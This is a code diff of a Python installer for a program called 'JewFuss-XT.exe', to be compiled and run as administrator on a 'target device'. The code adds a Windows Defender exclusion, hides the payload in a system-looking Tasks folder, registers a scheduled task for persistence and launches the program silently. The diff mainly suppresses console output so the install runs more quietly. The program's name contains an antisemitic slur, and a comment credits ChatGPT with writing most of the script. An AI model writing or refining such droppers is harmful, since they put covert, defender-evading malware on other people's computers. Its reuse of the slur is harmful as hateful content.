@@ -5,6 +5,7 @@ import subprocess
 import PyElevate
 import time
 import psutil
+
 # Sadly you cannot run this as a .py and must compile it first to test
 
 # compile command 
@@ -15,21 +16,27 @@ import psutil
 # using this requires a bit of setup, first complie jewfuus-xt and leave it in the builds folder
 # than compile this script using the command above, and run it the output exe as as adminastrator on target device
 
-# also you are god damn right chatGPT made this, i dont have the time nor knolage on scheduling tasks using commands
+# also you are god damn right chatGPT made most of this, I don't have the time nor knolage on scheduling tasks using commands
 
 # Define the target directory and name of bundled executable to run
 target_dir = r"C:\ProgramData\Microsoft\Windows\Tasks" # can be where ever the fuck you want
 app_name = "JewFuss-XT.exe"
 
+printnonerrors = False
+
+errored = False #dont change
 def add_defender_exclusion(file_path):
+    global errored
     try:
         defender_command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{file_path}\\""'
         subprocess.run(defender_command, shell=True, check=True)
-        print(f"Windows Defender exclusion added for {file_path}")
+        if printnonerrors: print(f"Windows Defender exclusion added for {file_path}")
     except subprocess.CalledProcessError as e:
         print(f"Error adding Defender exclusion: {e}")
+        errored = True
 
 def create_scheduled_task(task_name, file_path):
+    global errored
     try:
         schtasks_command = (
             f'schtasks /create /tn "{task_name}" /tr "{file_path}" '
@@ -48,10 +55,11 @@ def create_scheduled_task(task_name, file_path):
         subprocess.run(schtasks_command, shell=True, check=True)
         subprocess.run(disable_conditions_command, shell=True, check=True)
         
-        print(f"Scheduled task '{task_name}' created successfully with modified power & time conditions.")
+        if printnonerrors: print(f"Scheduled task '{task_name}' created successfully with modified power & time conditions.")
     
     except subprocess.CalledProcessError as e:
         print(f"Error creating scheduled task: {e}")
+        errored = True
 
 if not PyElevate.elevated():
     input("Please run this installer as an administrator.")
@@ -61,7 +69,7 @@ task_name = app_name.replace(".exe", "")
 
 if not os.path.exists(target_dir):
     os.makedirs(target_dir)
-    print(f"Created folder: {target_dir}")
+    if printnonerrors: print(f"Created folder: {target_dir}")
 
 if getattr(sys, 'frozen', False):
     temp_dir = sys._MEIPASS
@@ -71,26 +79,31 @@ else:
 extracted_app_path = os.path.join(temp_dir, app_name)
 final_app_path = os.path.join(target_dir, app_name)
 
-print(f"Installing to: {final_app_path}")
+if printnonerrors: print(f"Installing to: {final_app_path}")
 
 try:
     if os.path.exists(final_app_path):
         print(f"Found existing file")
         try:
             if any(app_name.lower() in (p.info['exe'] or '').lower() for p in psutil.process_iter(['exe'])): 
-                print("Terminating existing process...")
+                if printnonerrors: print("Terminating existing process...")
                 os.system(f'taskkill /im "{app_name}" /f ')
-                print(f"Terminated {app_name}, waiting 5 seconds for process to close...")
-                time.sleep(5)
+                if printnonerrors: print(f"Terminated {app_name}, waiting a second for process to close...")
+                time.sleep(1)
             os.remove(final_app_path)
-            print(f"Deleted existing file: {app_name}")
+            if printnonerrors: print(f"Deleted existing file: {app_name}")
         except Exception as e:
-            print(f"Error deleting existing file: {e}")
+            print(f"Error deleting existing file: {e}\nRetrying in 1 second...")
+            time.sleep(1)
+            try:
+                os.remove(final_app_path)
+            except Exception as e:
+                print(f"Fatal Error: Error deleting existing file: {e}")
             input("Press Enter to exit.")
             sys.exit(1)
     try:
         shutil.copy(extracted_app_path, final_app_path)
-        print(f"Copied {app_name} to {target_dir}")
+        if printnonerrors: print(f"Copied {app_name} to {target_dir}")
     except Exception as e:
         print(f"Fatal Error: Error moving file: {e}")
         input("Press Enter to exit.")
@@ -107,9 +120,11 @@ try:
     startupinfo = subprocess.STARTUPINFO()
     startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
     subprocess.Popen(final_app_path, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
-    print(f"Started {final_app_path} silently (no console)")
+    if printnonerrors: print(f"Started {final_app_path} silently (no console)")
 except Exception as e:
     print(f"Error running {app_name}: {e}")
-    
-input("Press Enter to exit.")    
+    errored = True
+
+if errored:
+    input("Press Enter to exit.")    
 sys.exit(0)
